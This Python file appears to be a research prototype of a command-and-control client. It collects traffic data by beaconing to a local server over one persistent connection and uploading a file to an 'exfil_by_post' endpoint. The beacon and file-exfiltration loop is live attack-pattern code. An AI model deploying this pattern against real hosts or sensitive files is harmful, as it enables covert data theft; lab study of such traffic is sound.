"""
This code is written on 5.2.2025 where use basic http.sever for communications.
The main important feature is that the connection goes over single TCP connection similar to other C2.
requirements:
1- all communication goes over single tcp i.e. a flow
2- multiple cmd executed 
3- customized pertubation (gan and rnd) for #packts, bytes, packet_size in both direction 
4- works in 3 modes a) normal communicaiton b) randomness c) gan projected 

Automation for data collection
1- beacon
"""
import httpx
import asyncio, random

async def main():
    transport = httpx.AsyncHTTPTransport(
        limits=httpx.Limits(
            max_keepalive_connections=1,  # Force one persistent connection
            max_connections=1             # Prevents multiple TCP connections
        ),
        #http1=True  # Explicitly enforce HTTP/1.1 (needed for keep-alive)
    )

    async with httpx.AsyncClient(
        base_url="http://localhost:5000",
        transport=transport, 
        headers={"Connection": "keep-alive"},  # Ensures persistent connection
        timeout=None,  # Prevents timeouts closing the connection,
        #follow_redirects=True #handle any redirection responses from the server.
    ) as client:
        for i in range (10):  
            client_id = "client001"
            condition_met = random.choice([True, False])
            if condition_met:
                response = await client.get(f"/beacon/?client_id={client_id}")
                print(response.text)
                await asyncio.sleep(2)  # Wait before sending another request
            else:
                file_path= "/home/mehrdad/PycharmProjects/C2_communication/README.md"
                with open(f"{file_path}", 'rb') as file:
                    files = {'file': (file_path, file, 'application/octet-stream')}
                    url = f"http://localhost:5000/exfil_by_post/?client_id={client_id}"
                    response = await client.post(url, files=files)
                    print(response.json())

if __name__ == "__main__":
    asyncio.run(main())
